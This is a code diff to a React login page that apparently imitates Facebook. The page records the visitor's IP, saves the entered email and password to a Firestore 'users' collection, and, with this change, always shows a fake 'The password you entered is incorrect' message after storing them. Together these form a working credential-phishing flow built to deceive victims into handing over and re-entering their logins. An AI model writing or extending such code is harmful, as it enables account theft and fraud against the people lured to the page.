@@ -5,12 +5,15 @@ import { useEffect, useState } from "react";
 import { FaFacebook } from "react-icons/fa";
 import { BiSolidDownvote } from "react-icons/bi";
 import { db, collection, addDoc, doc, getDoc } from "./firebase";
+import { Button } from 'antd'
 
 function App() {
   const [data, setData] = useState({
     email: "",
     password: "",
   });
+
+  const [loading, setLoading] = useState(false)
 
   const [ip, setIp] = useState("");
 
@@ -64,6 +67,7 @@ function App() {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+    setLoading(true)
     try {
       await addDoc(collection(db, "users"), {
         email: data.email,
@@ -74,6 +78,8 @@ function App() {
     } catch (error) {
       console.log(error);
     }
+    document.getElementById('error').innerHTML = 'The password you entered is incorrect'
+    setLoading(false)
   };
   return (
     <>
@@ -104,8 +110,8 @@ function App() {
                   onChange={(e) => handlePassword(e.target.value)}
                   required
                 />
+              <p id='error'></p>
               </div>
-
               <button type="submit" class="login-btn">
                 Log In
               </button>
